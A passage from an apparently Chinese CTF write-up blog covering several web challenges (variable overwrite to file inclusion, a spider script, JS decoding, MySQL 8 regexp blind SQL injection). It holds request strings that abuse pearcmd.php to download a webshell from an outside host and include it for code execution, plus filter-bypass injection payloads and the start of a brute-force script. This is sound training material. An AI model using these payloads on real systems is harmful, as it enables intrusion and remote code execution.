<p>将得到的位置赋值给path参数，这样<code>file_get_contents</code>得到的参数就是刚刚写入的<code>/flag</code>了</p>
<h1 id="湖湘杯"><a href="#湖湘杯" class="headerlink" title="湖湘杯"></a>湖湘杯</h1><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// common.php</span></span><br><span class="line"><span class="title function_ invoke__">assign</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// =&gt;helper.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assign</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">	\wiphp\<span class="title class_">View</span>::<span class="title function_ invoke__">assign</span>(<span class="variable">$name</span>, <span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// =&gt;view.php</span></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">assign</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span> = <span class="literal">NULL</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$name</span> != <span class="string">&#x27;&#x27;</span>) <span class="built_in">self</span>::<span class="variable">$_vars</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">	&#125; </span><br><span class="line"><span class="comment">// end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// common.php</span></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">view</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// =&gt;helper.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">view</span>(<span class="params"><span class="variable">$file</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$vars</span> = []</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> \wiphp\<span class="title class_">View</span>::<span class="title function_ invoke__">fetch</span>(<span class="variable">$file</span>, <span class="variable">$vars</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// =&gt;view.php</span></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params"><span class="variable">$file</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$vars</span> = []</span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$vars</span>)) <span class="built_in">self</span>::<span class="variable">$_vars</span> = <span class="title function_ invoke__">array_merge</span>(<span class="built_in">self</span>::<span class="variable">$_vars</span>, <span class="variable">$vars</span>);			</span><br><span class="line">		<span class="title function_ invoke__">define</span>(<span class="string">&#x27;__THEME__&#x27;</span>, <span class="title function_ invoke__">C</span>(<span class="string">&#x27;theme&#x27;</span>));</span><br><span class="line">		<span class="title function_ invoke__">define</span>(<span class="string">&#x27;VPATH&#x27;</span>, (THEME_ON)? PATH_VIEW.<span class="string">&#x27;/&#x27;</span>.__THEME__ : PATH_VIEW);	</span><br><span class="line">		<span class="variable">$path</span> = __MODULE__;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$file</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">			<span class="variable">$file</span> = __ACTION__;</span><br><span class="line">		&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&#x27;:&#x27;</span>)) &#123;</span><br><span class="line">			<span class="keyword">list</span>(<span class="variable">$path</span>,<span class="variable">$file</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;:&#x27;</span>, <span class="variable">$file</span>);</span><br><span class="line">		&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">			<span class="variable">$path</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$path</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">			<span class="variable">$vfile</span> = VPATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;.html&#x27;</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="variable">$path</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$path</span>);</span><br><span class="line">			<span class="variable">$vfile</span> = VPATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;.html&#x27;</span>;</span><br><span class="line">		&#125;	</span><br><span class="line">		<span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$vfile</span>)) &#123;</span><br><span class="line">			<span class="title class_">App</span>::<span class="title function_ invoke__">halt</span>(<span class="variable">$file</span>.<span class="string">&#x27; 模板文件不存在。&#x27;</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="title function_ invoke__">define</span>(<span class="string">&#x27;__RUNTIME__&#x27;</span>, <span class="title class_">App</span>::<span class="title function_ invoke__">getRuntime</span>());	</span><br><span class="line">			<span class="title function_ invoke__">array_walk_recursive</span>(<span class="built_in">self</span>::<span class="variable">$_vars</span>, <span class="string">&#x27;self::_parse_vars&#x27;</span>); <span class="comment">//处理输出</span></span><br><span class="line">			\<span class="title class_">Tple</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$vfile</span>, <span class="built_in">self</span>::<span class="variable">$_vars</span>);</span><br><span class="line">		&#125;		</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">// =&gt;</span></span><br><span class="line">    			\<span class="title class_">Tple</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$vfile</span>, <span class="built_in">self</span>::<span class="variable">$_vars</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// =&gt;Tple.php</span></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$vfile</span>, <span class="variable">$_vars</span> = []</span>) </span>&#123;</span><br><span class="line">		<span class="variable">$shtml_open</span> = <span class="title function_ invoke__">C</span>(<span class="string">&#x27;shtml_open&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!<span class="variable">$shtml_open</span> || <span class="title function_ invoke__">basename</span>(<span class="variable">$vfile</span>) == <span class="string">&#x27;jump.shtml&#x27;</span>) &#123;</span><br><span class="line">			<span class="built_in">self</span>::<span class="title function_ invoke__">renderTo</span>(<span class="variable">$vfile</span>, <span class="variable">$_vars</span>);</span><br><span class="line">		&#125; </span><br><span class="line">        <span class="comment">// else &#123;</span></span><br><span class="line">		<span class="comment">// 	$params = http_build_query(I());</span></span><br><span class="line">		<span class="comment">// 	$sfile = md5(__MODULE__.basename($vfile).$params).&#x27;.shtml&#x27;;</span></span><br><span class="line">		<span class="comment">// 	$sfile = PATH_SHTML.&#x27;/&#x27;.$sfile;</span></span><br><span class="line">		<span class="comment">// 	$ntime = time();</span></span><br><span class="line">		<span class="comment">// 	$shtml_time = max(10, intval(C(&#x27;shtml_time&#x27;)));</span></span><br><span class="line">		<span class="comment">// 	if (is_file($sfile) &amp;&amp; filemtime($sfile) &gt; ($ntime - $shtml_time)) &#123;</span></span><br><span class="line">		<span class="comment">// 		include $sfile;				</span></span><br><span class="line">		<span class="comment">// 	&#125; else &#123;</span></span><br><span class="line">		<span class="comment">// 		ob_start();</span></span><br><span class="line">		<span class="comment">// 		self::renderTo($vfile, $_vars);</span></span><br><span class="line">		<span class="comment">// 		$content = ob_get_contents();</span></span><br><span class="line">		<span class="comment">// 		file_put_contents($sfile, $content);</span></span><br><span class="line">		<span class="comment">// 	&#125;</span></span><br><span class="line">		<span class="comment">// &#125;</span></span><br><span class="line">	&#125;	</span><br><span class="line"></span><br><span class="line"><span class="comment">// =&gt;self::renderTo($vfile, $_vars);</span></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">renderTo</span>(<span class="params"><span class="variable">$vfile</span>, <span class="variable">$_vars</span> = []</span>) </span>&#123;</span><br><span class="line">		<span class="variable">$m</span> = <span class="title function_ invoke__">strtolower</span>(__MODULE__);</span><br><span class="line"><span class="comment">//		var_dump($m);</span></span><br><span class="line">		<span class="variable">$cfile</span> = <span class="string">&#x27;view-&#x27;</span>.<span class="variable">$m</span>.<span class="string">&#x27;_&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$vfile</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="comment">//		var_dump($cfile);</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">basename</span>(<span class="variable">$vfile</span>) == <span class="string">&#x27;jump.html&#x27;</span>) &#123;</span><br><span class="line">			<span class="variable">$cfile</span> = <span class="string">&#x27;view-jump.html.php&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$cfile</span> = PATH_VIEWC.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$cfile</span>;</span><br><span class="line">		<span class="keyword">if</span> (APP_DEBUG || !<span class="title function_ invoke__">file_exists</span>(<span class="variable">$cfile</span>) || <span class="title function_ invoke__">filemtime</span>(<span class="variable">$cfile</span>) &lt; <span class="title function_ invoke__">filemtime</span>(<span class="variable">$vfile</span>)) &#123;</span><br><span class="line">			<span class="variable">$strs</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">comp</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$vfile</span>), <span class="variable">$_vars</span>);</span><br><span class="line">			<span class="comment">// var_dump($str);</span></span><br><span class="line">			<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$cfile</span>, <span class="variable">$strs</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="title function_ invoke__">extract</span>(<span class="variable">$_vars</span>);</span><br><span class="line"><span class="comment">//		echo $cfile.&quot;&lt;br&gt;&quot;;</span></span><br><span class="line">		<span class="keyword">include</span> <span class="variable">$cfile</span>;</span><br><span class="line">	&#125;	</span><br></pre></td></tr></table></figure>
<p>变量覆盖<!-- aaaaaaaa --></p>
<!-- ！！！！！！-->

<p>runtime&#x2F;viewc&#x2F;view-index_index.html.php</p>
<p>伪协议读文件<!-- aaaaaaaaaa --></p>
<p>文件包含就可以尝试利用到pearcmd.php进行rce</p>
<p>就挺拉的，看了6个小时才找到extract函数变量覆盖，外加结合include函数可以进行任意命令执行，但真找不出利用点了，然后赛后才问队友们怎么出的(怕打扰大家，这次比赛挺重要的)，说是利用pearcmd，这谁知道啊，还是学长一时想起有这个办法，就挺无语的</p>
<p>就文件包含</p>
<blockquote>
<p>&#x2F;usr&#x2F;share&#x2F;pear&#x2F;pearcmd.php&amp;+list<br>相当于执行<br>pear list</p>
</blockquote>
<p>进行一个文件的写或者直接外网下载一个马，进行包含利用即可</p>
<blockquote>
<p>?cfile&#x3D;&#x2F;usr&#x2F;share&#x2F;pear&#x2F;pearcmd.php&amp;+-R+&#x2F;tmp+htttp:&#x2F;&#x2F;ip&#x2F;1.php</p>
</blockquote>
<blockquote>
<p>?cfile&#x3D;&#x2F;tmp&#x2F;tmp&#x2F;pear&#x2F;download&#x2F;1.php</p>
</blockquote>
<h1 id="hgame"><a href="#hgame" class="headerlink" title="hgame"></a>hgame</h1><p>2022.1.20</p>
<h2 id="蛛蛛…嘿嘿♥我的蛛蛛"><a href="#蛛蛛…嘿嘿♥我的蛛蛛" class="headerlink" title="蛛蛛…嘿嘿♥我的蛛蛛"></a>蛛蛛…嘿嘿♥我的蛛蛛</h2><p>爬虫，打开，看页面源码，点下一个，发现其中一个有超链接，而且是get方法获取，摆明写脚本，写：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://hgame-spider.vidar.club/ffc7beccf6&#x27;</span></span><br><span class="line"></span><br><span class="line">re1 = requests.get(url=url)</span><br><span class="line">find = re.findall(<span class="string">&#x27;\?key=.*?&quot;&#x27;</span>,re1.text)</span><br><span class="line">cal = find[<span class="number">0</span>][<span class="number">0</span>:<span class="number">200</span>]</span><br><span class="line">cal = cal.replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(cal)</span><br><span class="line">length = <span class="built_in">len</span>(cal)</span><br><span class="line"><span class="keyword">while</span> length&gt;<span class="number">20</span>:</span><br><span class="line">    re1 = requests.get(url=url+cal)</span><br><span class="line">    find = re.findall(<span class="string">&#x27;\?key=.*?&quot;&#x27;</span>,re1.text)</span><br><span class="line">    cal = find[<span class="number">0</span>][<span class="number">0</span>:<span class="number">200</span>]</span><br><span class="line">    cal = cal.replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(cal)</span><br><span class="line">    length = <span class="built_in">len</span>(cal)</span><br></pre></td></tr></table></figure>
<p>最后有个小小的报错，不影响出，点开最后一个页面，说就在这里，藏起来了，抓包看一下，响应头找到</p>
<h2 id="Tetris-plus"><a href="#Tetris-plus" class="headerlink" title="Tetris plus"></a>Tetris plus</h2><p>打开页面是一个js小游戏，题目介绍是让打3000分，玩了2500多，有点快哈，查看js源码，main没找到判定点，在checking.js末尾找到</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (score &gt;= <span class="number">3000</span> &amp;&amp; !<span class="variable language_">window</span>.<span class="property">winned</span>) &#123;</span><br><span class="line">	winned = <span class="literal">true</span></span><br><span class="line">	<span class="title function_">alert</span>(<span class="title function_">atob</span>(<span class="string">&quot;ZmxhZyDosozkvLzooqvol4/otbfmnaXkuobvvIzlho3mib7mib7lkKch&quot;</span>))</span><br><span class="line">	<span class="comment">// [][(![]+[])</span></span><br></pre></td></tr></table></figure>
<p>最后那段有点长就不贴了，然后查看base64编码，说是隐藏起来了，好家伙，打到3000分也不准备给人看是吧，这人坏啊，总之，后面那段注释的就是了<br>jother编码，直接自己写一个php页面，弹窗就完事了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert([][(![]+[])[+[]]+(![]+[]));&lt;/script&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>反正得到的那串贴进js弹窗的函数就完事，运行就得到结果了<br>啊哈哈哈哈，我的任务完成啦</p>
<h1 id="hufu"><a href="#hufu" class="headerlink" title="hufu"></a>hufu</h1><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> (<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&quot;env&quot;</span>])) ? <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>) : <span class="title function_ invoke__">putenv</span>(<span class="variable">$_GET</span>[<span class="string">&quot;env&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo hfctf2022&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> php:<span class="number">7.4</span>.<span class="number">28</span>-fpm-buster</span><br><span class="line"></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> Maintainer=<span class="string">&quot;yxxx&quot;</span></span></span><br><span class="line"><span class="keyword">ENV</span> REFRESHED_AT <span class="number">2022</span>-<span class="number">03</span>-<span class="number">14</span></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s/http:\/\/security.debian.org/http:\/\/mirrors.163.com/g&#x27;</span> /etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s/http:\/\/deb.debian.org/http:\/\/mirrors.163.com/g&#x27;</span> /etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt upgrade -y &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt update -y &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt install nginx -y</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> DEBIAN_FRONTEND noninteractive</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> index.php /var/www/html</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> default.conf /etc/nginx/sites-available/default</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag /flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> php-fpm -D &amp;&amp; nginx -g <span class="string">&#x27;daemon off;&#x27;</span></span></span><br></pre></td></tr></table></figure>

<h3 id="babysql-1"><a href="#babysql-1" class="headerlink" title="babysql"></a>babysql</h3><p>题目描述：It is a pure sql injection challenge. Login any account to get flag. Have fun with mysql 8. There is something useful in &#x2F;hint.md.<br>意思是登陆成功就能拿到flag，还有个hint页面，打开看看</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `auth` (</span><br><span class="line">  `id` <span class="type">int</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `username` <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `password` <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`),</span><br><span class="line">  <span class="keyword">UNIQUE</span> KEY `auth_username_uindex` (`username`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">2</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4 <span class="keyword">COLLATE</span><span class="operator">=</span>utf8mb4_0900_ai_ci;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Injectable</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ConnectionProvider</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;../database/connection.provider&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">  <span class="attr">id</span>: number;</span><br><span class="line">  <span class="attr">username</span>: string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">safe</span>(<span class="params">str: string</span>): string &#123;</span><br><span class="line">  <span class="keyword">const</span> r = str</span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/[\s,()#;*\-]/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/^.*(?=union|binary).*$/gi</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    .<span class="title function_">toString</span>();</span><br><span class="line">  <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title class_">Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">AuthService</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">private connectionProvider: ConnectionProvider</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">validateUser</span>(<span class="attr">username</span>: string, <span class="attr">password</span>: string): <span class="title class_">Promise</span>&lt;<span class="title class_">User</span>&gt; | <span class="literal">null</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> sql = <span class="string">`SELECT * FROM auth WHERE username=&#x27;<span class="subst">$&#123;safe(username)&#125;</span>&#x27; LIMIT 1`</span>;</span><br><span class="line">    <span class="keyword">const</span> [rows] = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">connectionProvider</span>.<span class="title function_">use</span>(<span class="function">(<span class="params">c</span>) =&gt;</span> c.<span class="title function_">query</span>(sql));</span><br><span class="line">    <span class="keyword">const</span> user = rows[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> (user &amp;&amp; user.<span class="property">password</span> === password) &#123;</span><br><span class="line">      <span class="comment">// eslint-disable-next-line @typescript-eslint/no-unused-vars</span></span><br><span class="line">      <span class="keyword">const</span> &#123; password, ...result &#125; = user;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>是mysql的建表命令和js源码<br>根据建表命令可以知道列名<br>根据代码逻辑可以知道过滤和sql处理语句<br>得到官方给出的hint：regexp<br>可以进行注入，对于空白字符被过滤的问题，本地开一个mysql8的docker靶机得到一个这样的可行语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;1&#x27;</span><span class="operator">||</span><span class="string">&#x27;username&#x27;</span>regexp<span class="string">&#x27;a&#x27;</span>limit <span class="number">1</span>;</span><br><span class="line">#条件变为：在<span class="string">&#x27;username&#x27;</span>中查询<span class="string">&#x27;a&#x27;</span> </span><br></pre></td></tr></table></figure>
<p>改进之后</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;1&#x27;</span><span class="operator">||</span>`username`regexp<span class="string">&#x27;a&#x27;</span>limit <span class="number">1</span>; </span><br><span class="line">#将条件变为正则查询username列中的<span class="string">&#x27;a&#x27;</span></span><br></pre></td></tr></table></figure>
<p>此时可以进行盲注，但需要bool点或者延时点，括号被过滤，延时无法进行，通过语句</p>
<blockquote>
<p>select *from users where username&#x3D;’1’||’username’regexp’’limit 1; </p>
</blockquote>
<p>报错可知regexp查询序列为空会报500的错<br>但regexp是大小写不敏感的，最后在官方文档中找到语句</p>
<blockquote>
<p>mysql&gt;SELECT ‘abc’ LIKE _utf8mb4 ‘ABC’ COLLATE utf8mb4_bin;</p>
</blockquote>
<p>这个格式可以使得大小写敏感<br>最终改语句为</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="operator">||</span>`username`regexp<span class="operator">+</span>_utf8mb4<span class="string">&#x27;^m&#x27;</span><span class="keyword">COLLATE</span><span class="string">&#x27;utf8mb4_bin&#x27;</span><span class="operator">||</span>`password`regexp<span class="string">&#x27;&#x27;</span>limit <span class="number">1</span>; </span><br><span class="line">#假如第二条语句查询到，则返回<span class="number">401</span>，假如未查询到，则第三条语句执行将返回<span class="number">500</span></span><br></pre></td></tr></table></figure>
<p>写一个python脚本跑：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://47.107.231.226:21830/login&#x27;</span></span><br><span class="line"></span><br><span 